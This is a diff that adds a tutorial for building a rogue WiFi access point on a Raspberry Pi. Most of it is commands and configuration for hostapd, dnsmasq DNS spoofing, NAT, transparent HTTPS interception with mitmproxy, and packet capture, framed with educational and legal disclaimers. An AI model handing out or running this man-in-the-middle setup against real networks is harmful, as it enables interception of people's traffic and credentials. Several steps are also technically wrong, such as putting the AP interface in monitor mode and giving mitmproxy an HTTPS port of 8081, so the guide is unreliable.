@@ -1,0 +1,174 @@
+Building a Rogue Access Point with Raspberry Pi
+Learn how to set up a WiFi honeypot for network security testing and demonstration of man-in-the-middle attacks using a Raspberry Pi.
+This tutorial will guide you through the process of creating a rogue access point (AP) using a Raspberry Pi. This setup can be used in a controlled environment to understand network vulnerabilities and demonstrate man-in-the-middle (MITM) attacks. Please remember that using this for unauthorized access or malicious activities is illegal and unethical. This tutorial is for educational purposes only.
+What you'll learn:
+ * Configure wireless interfaces in monitor mode
+ * Set up DHCP and DNS spoofing
+ * Implement transparent SSL proxying
+ * Analyze captured network traffic
+Prerequisites:
+ * Raspberry Pi (Model 3 B+ or later recommended for better WiFi performance)
+ * Raspberry Pi OS (Lite version is sufficient)
+ * MicroSD card (at least 16GB)
+ * USB WiFi adapter (recommended for better control and performance, especially one that supports monitor mode and packet injection)
+ * Ethernet cable (for initial setup and internet access for the Pi)
+ * A computer to SSH into the Raspberry Pi
+Estimated Time: 2.5 hours
+Difficulty: Advanced
+Step 1: Setting up the Raspberry Pi
+ * Install Raspberry Pi OS: Download and install Raspberry Pi OS (Lite or with Desktop) onto your microSD card using the Raspberry Pi Imager or a similar tool.
+ * Enable SSH: For a headless setup (without a monitor), enable SSH by creating an empty file named ssh in the root of the boot partition of the SD card.
+ * Boot the Raspberry Pi: Insert the microSD card into your Raspberry Pi and power it on.
+ * Connect via SSH: Connect your computer to the same network as the Raspberry Pi (initially via Ethernet). Use the default username (pi) and password (raspberry) to SSH into the Pi. You might need to find the Pi's IP address using your router's administration interface or a network scanning tool.
+   ssh pi@<your_pi_ip_address>
+
+ * Update and Upgrade: Once logged in, update and upgrade the system packages:
+   sudo apt update
+sudo apt full-upgrade -y
+
+ * Install Necessary Tools: Install the required software packages:
+   sudo apt install -y hostapd dnsmasq iptables libnetfilter-queue-dev python3 python3-pip
+sudo pip3 install scapy
+
+Step 2: Configuring the Wireless Interface for Monitor Mode
+ * Identify Wireless Interface(s): List the available network interfaces to identify your WiFi adapter(s).
+   iwconfig
+
+   You'll likely see wlan0 (the Raspberry Pi's built-in WiFi) and possibly wlan1 (your USB WiFi adapter). Note the name of the interface you intend to use for the rogue AP. It's generally recommended to use a separate USB adapter for this purpose. Let's assume your USB adapter is wlan1.
+ * Stop Network Services: Stop the wpa_supplicant service, which manages WiFi connections, as it can interfere with monitor mode.
+   sudo systemctl stop wpa_supplicant
+sudo systemctl disable wpa_supplicant
+
+ * Bring Down the Interface: Take down the wireless interface.
+   sudo ip link set wlan1 down
+
+ * Set to Monitor Mode: Put the wireless interface into monitor mode.
+   sudo iwconfig wlan1 mode monitor
+
+ * Bring Up the Interface: Bring the wireless interface back up.
+   sudo ip link set wlan1 up
+
+ * Verify Monitor Mode: Check if the interface is in monitor mode.
+   iwconfig wlan1
+
+   You should see Mode:Monitor in the output.
+Step 3: Setting up the Rogue Access Point (hostapd)
+ * Create hostapd Configuration File: Create a configuration file for hostapd.
+   sudo nano /etc/hostapd/hostapd.conf
+
+ * Edit the Configuration File: Add the following configuration, adjusting the parameters as needed:
+   interface=wlan1
+ssid=EvilAP # Your desired network name (SSID)
+channel=1 # Choose a channel (1, 6, or 11 are common)
+hw_mode=g # Or a for 5GHz if your adapter supports it
+wpa=2
+wpa_passphrase=password123 # Your desired password
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+rsn_pairwise=CCMP
+
+   * interface: The name of your wireless interface in monitor mode.
+   * ssid: The name of your rogue access point.
+   * channel: The WiFi channel to operate on.
+   * hw_mode: The wireless mode (g for 2.4GHz, a for 5GHz).
+   * wpa, wpa_passphrase, etc.: Security settings for your AP. You can also create an open network by removing these lines.
+ * Save and Close: Save the file (Ctrl+X, then Y, then Enter).
+ * Configure hostapd to Use the Configuration File: Edit the default hostapd configuration file to point to your custom file.
+   sudo nano /etc/default/hostapd
+
+   Uncomment the line #DAEMON_CONF="" and change it to:
+   DAEMON_CONF="/etc/hostapd/hostapd.conf"
+
+ * Start hostapd: Try starting the hostapd service.
+   sudo systemctl start hostapd
+
+   If you encounter errors, check the logs using sudo journalctl -u hostapd.service and ensure your wireless adapter is compatible and properly configured. You might need to kill any conflicting processes using sudo killall wpa_supplicant or sudo killall dhcpcd.
+Step 4: Setting up DHCP and DNS Spoofing (dnsmasq)
+ * Configure dnsmasq: Create or edit the dnsmasq configuration file.
+   sudo nano /etc/dnsmasq.conf
+
+   Comment out or remove any existing lines and add the following:
+   interface=wlan1
+dhcp-range=192.168.4.2,192.168.4.20,24h
+dhcp-option=3,192.168.4.1 # Gateway (our Pi's IP)
+dhcp-option=6,192.168.4.1 # DNS server (our Pi's IP)
+server=8.8.8.8 # Forward DNS queries to Google's DNS (optional, for internet access)
+server=/example.com/192.168.4.1 # Example DNS spoofing
+
+   * interface: The wireless interface.
+   * dhcp-range: The range of IP addresses to assign to clients.
+   * dhcp-option=3: Sets the default gateway for clients.
+   * dhcp-option=6: Sets the DNS server for clients.
+   * server: Specifies upstream DNS servers.
+   * server=/example.com/192.168.4.1: This line demonstrates DNS spoofing. Any request for example.com will be directed to the Pi's IP address.
+ * Set a Static IP Address for the Wireless Interface: Assign a static IP address to your wireless interface.
+   sudo nano /etc/dhcpcd.conf
+
+   Add the following lines at the end of the file (replace wlan1 with your interface if needed):
+   interface wlan1
+static ip_address=192.168.4.1/24
+
+ * Restart Services: Restart the dhcpcd, hostapd, and dnsmasq services.
+   sudo systemctl daemon-reload
+sudo systemctl restart dhcpcd
+sudo systemctl restart hostapd
+sudo systemctl restart dnsmasq
+
+Step 5: Enabling IP Forwarding and Setting up NAT
+To allow clients connected to your rogue AP to access the internet (if desired), you need to enable IP forwarding and set up Network Address Translation (NAT).
+ * Enable IP Forwarding:
+   sudo sysctl net.ipv4.ip_forward=1
+
+   To make this permanent across reboots, edit the sysctl.conf file:
+   sudo nano /etc/sysctl.conf
+
+   Uncomment the line #net.ipv4.ip_forward=1. Save and close the file.
+ * Set up NAT with iptables: Assuming your Raspberry Pi is connected to the internet via eth0, use the following iptables rules:
+   sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i wlan1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -o wlan1 -j ACCEPT
+
+   If you are using wlan0 for internet connectivity, replace eth0 with wlan0 in the commands above.
+ * Save iptables Rules: To make these rules persistent across reboots, you can install the iptables-persistent package:
+   sudo apt install -y iptables-persistent
+
+   When prompted, choose to save the current IPv4 and IPv6 rules.
+Step 6: Implementing Transparent SSL Proxying (mitmproxy)
+mitmproxy is a powerful tool for intercepting, inspecting, modifying, and replaying web traffic.
+ * Install mitmproxy: If you haven't already, install mitmproxy.
+   sudo pip3 install mitmproxy
+
+ * Redirect HTTP and HTTPS Traffic: Use iptables to redirect HTTP (port 80) and HTTPS (port 443) traffic to mitmproxy's default ports (8080 and 8081 respectively).
+   sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to-ports 8080
+sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-ports 8081
+
+ * Run mitmproxy: Start mitmproxy in transparent mode.
+   sudo mitmproxy --mode transparent --ssl-insecure
+
+   * --mode transparent: Enables transparent proxying.
+   * --ssl-insecure: Disables SSL certificate verification (for demonstration purposes only, be cautious in real-world scenarios).
+   Now, any HTTP or HTTPS traffic from a client connected to your rogue AP will be intercepted by mitmproxy, allowing you to inspect the requests and responses. You can view the intercepted traffic in the mitmproxy interface. Press q to quit.
+Step 7: Analyzing Captured Network Traffic (tcpdump/tshark)
+You can use tools like tcpdump or tshark (the command-line version of Wireshark) to capture and analyze network traffic.
+ * Capture Traffic with tcpdump:
+   sudo tcpdump -i wlan1 -w capture.pcap
+
+   This command will capture all traffic on the wlan1 interface and save it to a file named capture.pcap. You can later analyze this file with Wireshark. To filter traffic, you can add expressions like tcp port 80 for HTTP traffic or host <target_ip>.
+ * Capture Traffic with tshark:
+   sudo tshark -i wlan1 -w capture.pcap
+
+   tshark offers more advanced filtering options. Refer to the tshark documentation for details.
+Demonstration and Testing:
+ * Connect a Client Device: Connect a laptop or smartphone to the WiFi network you created (e.g., "EvilAP").
+ * Browse the Internet: Try Browse some websites on the client device.
+ * Observe Traffic:
+   * mitmproxy: You should see the HTTP and HTTPS requests and responses in the mitmproxy interface on your Raspberry Pi.
+   * tcpdump/tshark: Stop the capture after some Browse and then analyze the capture.pcap file using Wireshark on your computer. You should see the network packets exchanged.
+ * Test DNS Spoofing: Try accessing the domain you configured for spoofing (e.g., example.com). You should be redirected to the IP address of your Raspberry Pi (192.168.4.1).
+Important Considerations and Security Best Practices:
+ * Ethical Use: This setup should only be used in controlled environments for educational and testing purposes with explicit permission.
+ * Security Risks: Running a rogue AP can expose your Raspberry Pi and the connected network to security risks. Ensure your Pi is not directly connected to your primary network during testing.
+ * Legal Implications: Creating and using rogue access points without authorization is illegal in most jurisdictions.
+ * Cleanup: After testing, remember to disable the rogue AP services and revert any configuration changes. You can re-enable your original WiFi by starting wpa_supplicant and configuring your WiFi settings.
+ * Advanced Techniques: This tutorial covers the basics. You can further enhance your rogue AP with tools for packet injection, more sophisticated MITM attacks (like ARP spoofing), and captive portals.
+This tutorial provides a foundation for understanding how rogue access points work and the potential security implications. Remember to use this knowledge responsibly and ethically.
